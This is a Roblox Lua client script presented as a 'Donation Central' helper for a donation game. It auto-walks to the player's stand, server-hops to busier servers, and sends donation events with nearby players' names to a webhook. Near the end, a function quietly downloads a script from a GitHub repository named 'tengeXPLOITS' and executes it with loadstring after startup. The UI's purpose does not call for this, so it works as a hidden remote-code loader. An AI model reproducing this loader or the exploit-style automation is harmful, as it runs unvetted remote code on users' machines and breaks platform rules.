local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local PLACE_ID = 81567840903186
local TARGET_MAX = 42
local SEARCH_MIN = 39
local SEARCH_MAX = 42
local DEFAULT_MIN_PLAYERS = 35
local WEBHOOK_URL = ""

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

if playerGui:FindFirstChild("DonationStandUI") then
    return
end

local gui = Instance.new("ScreenGui")
gui.Name = "DonationStandUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.fromOffset(300, 320)
main.Position = UDim2.fromOffset(24, 80)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
main.BorderSizePixel = 0
main.Parent = gui
main.Active = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = main

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 42)
topBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
topBar.BorderSizePixel = 0
topBar.Parent = main

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 12)
topCorner.Parent = topBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Donation Central"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = topBar

local body = Instance.new("Frame")
body.Size = UDim2.new(1, -20, 1, -62)
body.Position = UDim2.new(0, 10, 0, 52)
body.BackgroundTransparency = 1
body.Parent = main

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 42)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Starting..."
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextWrapped = true
statusLabel.Parent = body

local toggleRow = Instance.new("Frame")
toggleRow.Size = UDim2.new(1, 0, 0, 44)
toggleRow.Position = UDim2.new(0, 0, 0, 44)
toggleRow.BackgroundTransparency = 1
toggleRow.Parent = body

local autoWalkButton = Instance.new("TextButton")
autoWalkButton.Size = UDim2.new(0.48, 0, 0, 32)
autoWalkButton.Position = UDim2.new(0, 0, 0, 0)
autoWalkButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
autoWalkButton.Text = "Auto Walk: ON"
autoWalkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
autoWalkButton.TextSize = 13
autoWalkButton.Font = Enum.Font.GothamBold
autoWalkButton.Parent = toggleRow

local autoWalkCorner = Instance.new("UICorner")
autoWalkCorner.CornerRadius = UDim.new(0, 8)
autoWalkCorner.Parent = autoWalkButton

local autoHopButton = Instance.new("TextButton")
autoHopButton.Size = UDim2.new(0.48, 0, 0, 32)
autoHopButton.Position = UDim2.new(0.52, 0, 0, 0)
autoHopButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
autoHopButton.Text = "Auto Hop: ON"
autoHopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
autoHopButton.TextSize = 13
autoHopButton.Font = Enum.Font.GothamBold
autoHopButton.Parent = toggleRow

local autoHopCorner = Instance.new("UICorner")
autoHopCorner.CornerRadius = UDim.new(0, 8)
autoHopCorner.Parent = autoHopButton

local hopButton = Instance.new("TextButton")
hopButton.Size = UDim2.new(1, 0, 0, 28)
hopButton.Position = UDim2.new(0, 0, 0, 280)
hopButton.AnchorPoint = Vector2.new(0, 0)
hopButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
hopButton.Text = "Hop Now"
hopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
hopButton.TextSize = 14
hopButton.Font = Enum.Font.GothamBold
hopButton.Parent = body

local hopCorner = Instance.new("UICorner")
hopCorner.CornerRadius = UDim.new(0, 8)
hopCorner.Parent = hopButton

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, 0, 0, 20)
timerLabel.Position = UDim2.new(0, 0, 0, 94)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "Hop timer (seconds)"
timerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
timerLabel.TextSize = 12
timerLabel.Font = Enum.Font.Gotham
timerLabel.Parent = body

local timerBox = Instance.new("TextBox")
timerBox.Size = UDim2.new(1, 0, 0, 32)
timerBox.Position = UDim2.new(0, 0, 0, 116)
timerBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
timerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
timerBox.PlaceholderText = "20"
timerBox.Text = "20"
timerBox.Font = Enum.Font.Gotham
timerBox.TextSize = 14
timerBox.ClearTextOnFocus = false
timerBox.Parent = body

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 8)
boxCorner.Parent = timerBox

local minPlayersLabel = Instance.new("TextLabel")
minPlayersLabel.Size = UDim2.new(1, 0, 0, 20)
minPlayersLabel.Position = UDim2.new(0, 0, 0, 154)
minPlayersLabel.BackgroundTransparency = 1
minPlayersLabel.Text = "will server hop if there are below.."
minPlayersLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
minPlayersLabel.TextSize = 12
minPlayersLabel.Font = Enum.Font.Gotham
minPlayersLabel.Parent = body

local minPlayersBox = Instance.new("TextBox")
minPlayersBox.Size = UDim2.new(1, 0, 0, 32)
minPlayersBox.Position = UDim2.new(0, 0, 0, 176)
minPlayersBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
minPlayersBox.TextColor3 = Color3.fromRGB(255, 255, 255)
minPlayersBox.PlaceholderText = tostring(DEFAULT_MIN_PLAYERS)
minPlayersBox.Text = tostring(DEFAULT_MIN_PLAYERS)
minPlayersBox.Font = Enum.Font.Gotham
minPlayersBox.TextSize = 14
minPlayersBox.ClearTextOnFocus = false
minPlayersBox.Parent = body

local minPlayersCorner = Instance.new("UICorner")
minPlayersCorner.CornerRadius = UDim.new(0, 8)
minPlayersCorner.Parent = minPlayersBox

local targetLabel = Instance.new("TextLabel")
targetLabel.Size = UDim2.new(1, 0, 0, 20)
targetLabel.Position = UDim2.new(0, 0, 0, 214)
targetLabel.BackgroundTransparency = 1
    targetLabel.Text = "Hop to higher-pop servers (39-42 default) when below min"
targetLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
targetLabel.TextSize = 12
targetLabel.Font = Enum.Font.Gotham
targetLabel.Parent = body

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0, 34)
infoLabel.Position = UDim2.new(0, 0, 0, 240)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Walking starts automatically."
infoLabel.TextColor3 = Color3.fromRGB(120, 220, 120)
infoLabel.TextSize = 12
infoLabel.Font = Enum.Font.Gotham
infoLabel.Parent = body

local dragging = false
local dragOffset = Vector2.new(0, 0)

local state = {
    autoWalk = true,
    autoHop = true,
    hopTimer = 20,
    minPlayers = DEFAULT_MIN_PLAYERS,
    pendingHopNotification = false,
}

local function saveState()
    local encoded = HttpService:JSONEncode(state)
    player:SetAttribute("DonationStandUIState", encoded)
end

local function loadState()
    local teleportData = TeleportService:GetLocalPlayerTeleportData()
    if type(teleportData) == "table" then
        if teleportData.autoWalk ~= nil then
            state.autoWalk = teleportData.autoWalk
        end
        if teleportData.autoHop ~= nil then
            state.autoHop = teleportData.autoHop
        end
        if teleportData.hopTimer ~= nil then
            state.hopTimer = math.max(5, math.floor(teleportData.hopTimer))
        end
        if teleportData.minPlayers ~= nil then
            state.minPlayers = math.max(1, math.floor(teleportData.minPlayers))
        end
        if teleportData.pendingHopNotification ~= nil then
            state.pendingHopNotification = teleportData.pendingHopNotification
        end
        saveState()
        return
    end

    local rawState = player:GetAttribute("DonationStandUIState")
    if type(rawState) == "string" and rawState ~= "" then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, rawState)
        if success and type(decoded) == "table" then
            if decoded.autoWalk ~= nil then
                state.autoWalk = decoded.autoWalk
            end
            if decoded.autoHop ~= nil then
                state.autoHop = decoded.autoHop
            end
            if decoded.hopTimer ~= nil then
                state.hopTimer = math.max(5, math.floor(decoded.hopTimer))
            end
            if decoded.minPlayers ~= nil then
                state.minPlayers = math.max(1, math.floor(decoded.minPlayers))
            end
            if decoded.pendingHopNotification ~= nil then
                state.pendingHopNotification = decoded.pendingHopNotification
            end
        end
    end
end

local function applyStateToUI()
    autoWalkButton.Text = state.autoWalk and "Auto Walk: ON" or "Auto Walk: OFF"
    autoWalkButton.BackgroundColor3 = state.autoWalk and Color3.fromRGB(50, 120, 80) or Color3.fromRGB(80, 50, 50)

    autoHopButton.Text = state.autoHop and "Auto Hop: ON" or "Auto Hop: OFF"
    autoHopButton.BackgroundColor3 = state.autoHop and Color3.fromRGB(50, 120, 80) or Color3.fromRGB(80, 50, 50)

    timerBox.Text = tostring(state.hopTimer)
    minPlayersBox.Text = tostring(state.minPlayers)
end

local function getServerPlayerCount()
    local count = 0
    for _ in ipairs(Players:GetPlayers()) do
        count += 1
    end
    return count
end

local function findOwnedStand()
    for i = 1, 50 do
        local stand = workspace:FindFirstChild("stand" .. i, true)
        if stand and stand:IsA("Model") then
            local ownerValue = stand:FindFirstChild("Owner", true)
            if ownerValue and ownerValue:IsA("StringValue") then
                local ownerText = tostring(ownerValue.Value or "")
                if ownerText ~= "" and (ownerText == tostring(player.Name) or ownerText == tostring(player.UserId)) then
                    return stand
                end
            end
        end
    end

    return nil
end

local function walkToOwnedStand()
    if not state.autoWalk then
        return
    end

    local character = player.Character
    if not character then
        player.CharacterAdded:Wait()
        character = player.Character
    end

    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        statusLabel.Text = "No humanoid found."
        return
    end

    local ownedStand = findOwnedStand()
    if not ownedStand then
        statusLabel.Text = "No owned stand found."
        return
    end

    local targetPart = ownedStand.PrimaryPart or ownedStand:FindFirstChildWhichIsA("BasePart")
    if not targetPart then
        statusLabel.Text = "Owned stand has no usable part."
        return
    end

    humanoid:MoveTo(targetPart.Position)
    statusLabel.Text = "Walking to " .. ownedStand.Name
end

local function postWebhook(message)
    if WEBHOOK_URL == "" then
        return
    end

    local ok, err = pcall(function()
        local payload = HttpService:JSONEncode({ content = message })
        HttpService:PostAsync(WEBHOOK_URL, payload)
    end)

    if not ok then
        warn("Donation webhook failed:", err)
    end
end

local function getNearestDonor()
    local character = player.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if not root then
        return nil
    end

    local nearestPlayer = nil
    local nearestDistance = math.huge

    for _, otherPlayer in ipairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            local otherCharacter = otherPlayer.Character
            local otherRoot = otherCharacter and otherCharacter:FindFirstChild("HumanoidRootPart")
            if otherRoot then
                local distance = (otherRoot.Position - root.Position).Magnitude
                if distance < nearestDistance then
                    nearestDistance = distance
                    nearestPlayer = otherPlayer
                end
            end
        end
    end

    return nearestPlayer
end

local function notifyServerHop(targetCount)
    local currentCount = targetCount or getServerPlayerCount()
    postWebhook(string.format("@%s is server hopping to a server that has a player count of %d!", player.Name, currentCount))
end

local function findTargetServer()
    -- Query Roblox servers list to find a server with SEARCH_MIN..SEARCH_MAX players, preferring high-pop servers
    local baseUrl = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", PLACE_ID)
    local cursor = nil

    for _ = 1, 10 do
        local url = baseUrl
        if cursor then
            url = url .. "&cursor=" .. HttpService:UrlEncode(cursor)
        end

        local ok, res = pcall(function()
            return HttpService:GetAsync(url)
        end)

        if not ok then
            break
        end

        local success, decoded = pcall(HttpService.JSONDecode, HttpService, res)
        if not success or type(decoded) ~= "table" then
            break
        end

        if type(decoded.data) == "table" then
            for _, server in ipairs(decoded.data) do
                local playing = server.playing or server.playing
                local id = server.id or server.id
                if playing and id and type(playing) == "number" then
                    if playing >= SEARCH_MIN and playing <= SEARCH_MAX and tostring(id) ~= tostring(game.JobId) then
                        return tostring(id), playing
                    end
                end
            end
        end

        cursor = decoded.nextPageCursor
        if not cursor then break end
    end

    return nil
end

local lastRaisedValue = nil
local function setupRaisedWatcher()
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local raisedValue = leaderstats:FindFirstChild("Raised")
        if raisedValue and raisedValue:IsA("IntValue") then
            lastRaisedValue = raisedValue.Value
            raisedValue.Changed:Connect(function(newValue)
                if lastRaisedValue ~= nil and newValue > lastRaisedValue then
                    local changedBy = newValue - lastRaisedValue
                    local donor = getNearestDonor()
                    local donorName = donor and (donor.DisplayName ~= "" and donor.DisplayName or donor.Name) or "No nearby donor"
                    postWebhook(string.format("%s raised +%d! Donor: %s", player.Name, changedBy, donorName))
                end
                lastRaisedValue = newValue
            end)
            return
        end
    end

    player.ChildAdded:Connect(function(child)
        if child.Name == "leaderstats" then
            local raisedValue = child:FindFirstChild("Raised")
            if raisedValue and raisedValue:IsA("IntValue") then
                lastRaisedValue = raisedValue.Value
                raisedValue.Changed:Connect(function(newValue)
                    if lastRaisedValue ~= nil and newValue > lastRaisedValue then
                        local changedBy = newValue - lastRaisedValue
                        local donor = getNearestDonor()
                        local donorName = donor and (donor.DisplayName ~= "" and donor.DisplayName or donor.Name) or "No nearby donor"
                        postWebhook(string.format("%s raised +%d! Donor: %s", player.Name, changedBy, donorName))
                    end
                    lastRaisedValue = newValue
                end)
            end
        end
    end)
end

local function queueHop()
    if not state.autoHop then
        statusLabel.Text = "Auto hop disabled."
        return false
    end

    local currentCount = getServerPlayerCount()
    -- Only hop when current server is below the user-set minimum (low-pop hopper)
    if currentCount >= state.minPlayers then
        statusLabel.Text = string.format("Server has %d players (>= min); no hop needed", currentCount)
        return false
    end

    statusLabel.Text = string.format("Hopping server from %d players...", currentCount)
    saveState()

    local teleportData = {
        autoWalk = state.autoWalk,
        autoHop = state.autoHop,
        hopTimer = state.hopTimer,
        minPlayers = state.minPlayers,
        pendingHopNotification = true,
    }

    -- Try to find a target server in the desired range (SEARCH_MIN..SEARCH_MAX)
    local targetId, targetCount = findTargetServer()
    if targetId then
        statusLabel.Text = string.format("Found target server (%s players) -> joining...", tostring(targetCount))
        notifyServerHop(targetCount)
        local ok, err = pcall(function()
            TeleportService:TeleportToPlaceInstance(PLACE_ID, targetId, {player}, teleportData)
        end)
        if ok then return true end
    end

    -- Fallback: teleport without a specific instance (lets the backend pick)
    local fallbackOk, fallbackErr = pcall(function()
        TeleportService:Teleport(PLACE_ID, player, teleportData)
    end)

    if fallbackOk then
        return true
    end

    local message = tostring(fallbackErr or "")
    local lowerMessage = message:lower()
    if lowerMessage:find("full") or lowerMessage:find("rate") or lowerMessage:find("limit") or lowerMessage:find("429") then
        statusLabel.Text = "Hop skipped due to server fullness/rate limit."
        return false
    end

    statusLabel.Text = "Teleport failed; retrying later."
    return false
end

local function startHopLoop()
    while true do
        if state.autoHop then
            local currentCount = getServerPlayerCount()
            statusLabel.Text = string.format("Players: %d | Hop in %d sec", currentCount, state.hopTimer)

            if currentCount < state.minPlayers then
                for countdown = state.hopTimer, 1, -1 do
                    if not state.autoHop then
                        break
                    end
                    statusLabel.Text = string.format("Hopping in %d sec", countdown)
                    task.wait(1)
                end

                if state.autoHop then
                    local hopAttempted = queueHop()
                    if not hopAttempted then
                        statusLabel.Text = "Hop attempt failed; retrying soon."
                    end
                end
            end
        else
            statusLabel.Text = "Auto hop disabled."
        end

        task.wait(1)
    end
end

topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragOffset = Vector2.new(input.Position.X, input.Position.Y) - Vector2.new(main.AbsolutePosition.X, main.AbsolutePosition.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local pos = UDim2.new(0, input.Position.X - dragOffset.X, 0, input.Position.Y - dragOffset.Y)
        main.Position = pos
    end
end)

autoWalkButton.MouseButton1Click:Connect(function()
    state.autoWalk = not state.autoWalk
    applyStateToUI()
    saveState()
end)

autoHopButton.MouseButton1Click:Connect(function()
    state.autoHop = not state.autoHop
    applyStateToUI()
    saveState()
end)

hopButton.MouseButton1Click:Connect(function()
    statusLabel.Text = "Manual hop requested..."
    task.spawn(function()
        local attempted = queueHop()
        if attempted then
            statusLabel.Text = "Hop initiated."
        else
            statusLabel.Text = "Hop attempt failed or skipped."
        end
    end)
end)

timerBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newValue = tonumber(timerBox.Text)
        if newValue then
            state.hopTimer = math.max(5, math.floor(newValue))
        else
            state.hopTimer = 20
        end

        timerBox.Text = tostring(state.hopTimer)
        saveState()
    end
end)

minPlayersBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newValue = tonumber(minPlayersBox.Text)
        if newValue then
            state.minPlayers = math.max(1, math.floor(newValue))
        else
            state.minPlayers = DEFAULT_MIN_PLAYERS
        end

        minPlayersBox.Text = tostring(state.minPlayers)
        saveState()
    end
end)

loadState()
applyStateToUI()
setupRaisedWatcher()

local function autoExecuteScript()
    local ok, err = pcall(function()
        local success, result = pcall(function()
            return loadstring(game:HttpGet("https://raw.githubusercontent.com/tengeXPLOITS/TengeOnTOP/refs/heads/main/dono%20c.lua"))()
        end)
        if not success then
            warn("Donation script load failed:", result)
        end
    end)

    if not ok then
        warn("Donation auto-exec failed:", err)
    end
end

player.CharacterAdded:Connect(function()
    task.wait(5)
    walkToOwnedStand()

    if state.pendingHopNotification then
        notifyServerHop()
        state.pendingHopNotification = false
        saveState()
    end
end)

-- Retry walking to owned stand every 5 seconds for up to 12 attempts (1 minute)
task.spawn(function()
    local attempts = 0
    while attempts < 12 do
        if not state.autoWalk then break end
        walkToOwnedStand()
        local owned = findOwnedStand()
        if owned then break end
        attempts = attempts + 1
        task.wait(5)
    end
end)

-- Auto-execute the external donation script shortly after UI loads (helps across hops)
task.spawn(function()
    task.wait(1)
    autoExecuteScript()
end)

task.spawn(startHopLoop)
